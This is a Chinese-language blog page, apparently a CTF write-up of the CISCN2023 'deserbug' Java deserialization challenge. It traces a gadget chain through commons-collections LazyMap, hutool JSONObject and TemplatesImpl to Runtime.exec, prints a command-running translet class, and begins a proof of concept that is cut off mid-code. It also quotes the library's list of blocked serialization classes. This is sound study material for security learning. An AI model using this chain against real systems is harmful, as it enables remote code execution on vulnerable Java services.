@@ -1,0 +1,752 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    CISCN2023-deserbug复现 |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="[TOC] 题目描述： 1231 . cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept2. jdk8u202  源码分析 题目给了源码  从附件中可以看到两个依赖，分别是common-colletions-3.2.2和hutool-all-5.8.18两个版本，首先能够想到的就是常规的CC链子，需要注意的是这里使用的是C">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CISCN2023-deserbug复现">
+<meta property="og:url" content="http://example.com/2025/09/29/CISCN2023-deserbug%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="[TOC] 题目描述： 1231 . cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept2. jdk8u202  源码分析 题目给了源码  从附件中可以看到两个依赖，分别是common-colletions-3.2.2和hutool-all-5.8.18两个版本，首先能够想到的就是常规的CC链子，需要注意的是这里使用的是C">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/09/29/images/ima92513034.png">
+<meta property="og:image" content="http://example.com/2025/09/29/images/image-003830113.png">
+<meta property="article:published_time" content="2025-09-29T01:23:05.000Z">
+<meta property="article:modified_time" content="2025-12-16T16:25:45.551Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JAVA安全">
+<meta property="article:tag" content="JAVA反序列化">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/09/29/images/ima92513034.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="CISCN2023-deserbug复现">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">CISCN2023-deserbug复现</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text"> 源码分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text"> 攻击利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3"><span class="toc-number">3.</span> <span class="toc-text"> 问题&amp;解决</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4poc"><span class="toc-number">4.</span> <span class="toc-text"> 完整POC</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">396</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">327</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-CISCN2023-deserbug复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/09/29/CISCN2023-deserbug%E5%A4%8D%E7%8E%B0/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-09-29T01:23:05.000Z" itemprop="datePublished">2025-09-29</time>
+    <time style="display: none;" id="post-update-time">2025-12-17</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p>[TOC]</p>
+<p>题目描述：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 . cn.hutool.json.JSONObject.put-&gt;com.app.Myexpect#getAnyexcept</span><br><span class="line"></span><br><span class="line">2. jdk8u202</span><br></pre></td></tr></table></figure>
+<h2 id="源码分析"><a class="markdownIt-Anchor" href="#源码分析"></a> 源码分析</h2>
+<p>题目给了源码</p>
+<p><img src="../images/ima92513034.png" alt="image092513034" /></p>
+<p>从附件中可以看到两个依赖，分别是<code>common-colletions-3.2.2</code>和<code>hutool-all-5.8.18</code>两个版本，首先能够想到的就是常规的<code>CC</code>链子，需要注意的是这里使用的是<code>CC3.2.2</code>，比我们漏洞百出的<code>3.2.1</code>多了一个小版本，换上这个小版本对之前的东西进行复现发现会出现报错，原因是多了一个<code>checkUnsafeSerialization</code>函数，对序列化的类进行了检查，禁止了以下一些类的序列化。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">WhileClosure</span><br><span class="line">CloneTransformer</span><br><span class="line">ForClosure</span><br><span class="line">InstantiateFactory</span><br><span class="line">InstantiateTransformer</span><br><span class="line">InvokerTransformer</span><br><span class="line">PrototypeCloneFactory</span><br><span class="line">PrototypeSerializationFactory</span><br></pre></td></tr></table></figure>
+<p>反编译一下，只有两个类</p>
+<p><strong>Myextect.java:</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA</span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> com.app;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Myexpect</span> <span class="keyword">extends</span> <span class="title class_">Exception</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Class[] typeparam;</span><br><span class="line">    <span class="keyword">private</span> Object[] typearg;</span><br><span class="line">    <span class="keyword">private</span> Class targetclass;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String anyexcept;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">	<span class="keyword">public</span> Object <span class="title function_">getAnyexcept</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">         <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> <span class="built_in">this</span>.targetclass.getConstructor(<span class="built_in">this</span>.typeparam);</span><br><span class="line">         <span class="keyword">return</span> con.newInstance(<span class="built_in">this</span>.typearg);</span><br><span class="line">   &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Test.java：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Testapp</span> &#123;</span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">         HttpUtil.createServer(<span class="number">8888</span>)</span><br><span class="line">           .addAction(<span class="string">&quot;/&quot;</span>, (request, response) -&gt; &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">bugstr</span> <span class="operator">=</span> request.getParam(<span class="string">&quot;bugstr&quot;</span>);</span><br><span class="line">           <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">           <span class="keyword">if</span> (bugstr == <span class="literal">null</span>) &#123;</span><br><span class="line">             response.write(<span class="string">&quot;welcome,plz give me bugstr&quot;</span>, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">           &#125;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">             <span class="type">byte</span>[] decode = Base64.getDecoder().decode(bugstr);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(decode));</span><br><span class="line">             <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> inputStream.readObject(); <span class="comment">//原生反序列化</span></span><br><span class="line">             result = object.toString();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">             <span class="type">Myexpect</span> <span class="variable">myexpect</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myexpect</span>();</span><br><span class="line">             myexpect.setTypeparam(<span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;);</span><br><span class="line">             myexpect.setTypearg((Object[])<span class="keyword">new</span> <span class="title class_">String</span>[] &#123; e.toString() &#125;);</span><br><span class="line">             myexpect.setTargetclass(e.getClass());</span><br><span class="line">             <span class="keyword">try</span> &#123;</span><br><span class="line">               result = myexpect.getAnyexcept().toString();</span><br><span class="line">                 &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line">               result = ex.toString();</span><br><span class="line">             &#125; </span><br><span class="line">           &#125;</span><br><span class="line">           response.write(result, ContentType.TEXT_PLAIN.toString());</span><br><span class="line">             &#125;).start();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>根据提示我们看到<code>Myexpect#getAnyexcept</code>，发现和CC3链中的<code>InstantiateTransformer#transform</code>里的代码几乎一模一样</p>
+<p>是用来<strong>调用一个类的构造方法</strong>的</p>
+<p>我们在CC3链中是调用TrAXFilter类的构造方法，从而触发<code>templates.newTransformer()</code></p>
+<p>那我们这里也可以考虑<strong>利用动态类加载进行任意RCE</strong></p>
+<p>我们利用点确定了，往回找，哪里能触发<code>Myexpect#getAnyexcept()</code>方法呢，继续跟着题目的提示,</p>
+<p>我们找到cn.hutool.json.JSONObject.put方法：</p>
+<p>JsonObject:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JSONObject</span> <span class="keyword">extends</span> <span class="title class_">MapWrapper</span>&lt;String, Object&gt; <span class="keyword">implements</span> <span class="title class_">JSON</span>, JSONGetter&lt;String&gt; &#123;</span><br><span class="line">...</span><br><span class="line"><span class="meta">@Deprecated</span></span><br><span class="line">    <span class="keyword">public</span> JSONObject <span class="title function_">put</span><span class="params">(String key, Object value)</span> <span class="keyword">throws</span> JSONException &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.set(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>似乎调用了**<code>JSONObject.put(x,new Myexpect())</code>**就能触发<code>Myexpect#getAnyexcept()</code>方法</p>
+<p>这里调用栈太多了，就不看了</p>
+<p>测试一下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">JSONObject</span> <span class="variable">jsonObject</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>();</span><br><span class="line">        jsonObject.put(<span class="string">&quot;111&quot;</span>, <span class="keyword">new</span> <span class="title class_">Myexpect</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">修改Myexpect.getAnyexpect():</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">public Object getAnyexcept() throws Exception &#123;</span></span><br><span class="line"><span class="comment">        System.out.println(&quot;hhhhhh&quot;);</span></span><br><span class="line"><span class="comment">        Constructor con = this.targetclass.getConstructor(this.typeparam);</span></span><br><span class="line"><span class="comment">        return con.newInstance(this.typearg);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 可以看到输出hhhhhh  即成功调用getAnyexcept</span></span><br></pre></td></tr></table></figure>
+<p>这里也确定了，那继续找哪里调用了put方法</p>
+<p>由于JSONObject是继承了MapWrapper，所以也可以通过<strong>map.put</strong>触发</p>
+<p>LazyMap#get里面就有put方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// LazyMap.get   可以看到先调用transform获得value然后map.put(key,value) </span></span><br><span class="line"><span class="comment">// 那么这里利用 ConstantTransformer 让value为Myexpect对象即可</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.map.containsKey(key)) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> <span class="built_in">this</span>.factory.transform(key);</span><br><span class="line">            <span class="built_in">this</span>.map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.map.get(key);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>那从这里一直到readObject不就是CC6链的前半段吗（<strong>HashSet<code>、</code>HashMap<code>、</code>TiedMapEntry<code>、</code>LazyMap</strong>）</p>
+<h2 id="攻击利用"><a class="markdownIt-Anchor" href="#攻击利用"></a> 攻击利用</h2>
+<p>那这里我们的思路就理清了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">HashMap#readObject()</span><br><span class="line">    -&gt;HashMap#hash()</span><br><span class="line">    -&gt;TiedMapEntry#hashCode()</span><br><span class="line">    -&gt;TiedMapEntry#getValue()</span><br><span class="line">    -&gt;LazyMap#get()</span><br><span class="line">    -&gt;cn.hutool.json.JSONObject.put()</span><br><span class="line">    -&gt;Myexpect#getAnyexcept()</span><br><span class="line">    -&gt;TrAXFilter#constructor()</span><br><span class="line">	-&gt;TemplatesImpl#newTransformer()</span><br><span class="line">	-&gt;Runtime.exec</span><br></pre></td></tr></table></figure>
+<p>其实就是</p>
+<ul>
+<li>CC6前段(<code>HashSet</code>、<code>HashMap</code>、<code>TiedMapEntry</code>、<code>LazyMap</code>)</li>
+<li>中段<code>JSONObject</code> + <code>Myexpect</code></li>
+<li>CC3后段(<code>TrAXFilter</code>、<code>TemplatesImpl)</code></li>
+</ul>
+<p>先创建一个测试利用类runtime.java，来测试链有没有用</p>
+<p>runtime.java:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">runtime</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>测试POC:</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CTF;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.hutool.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.app.Myexpect;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span 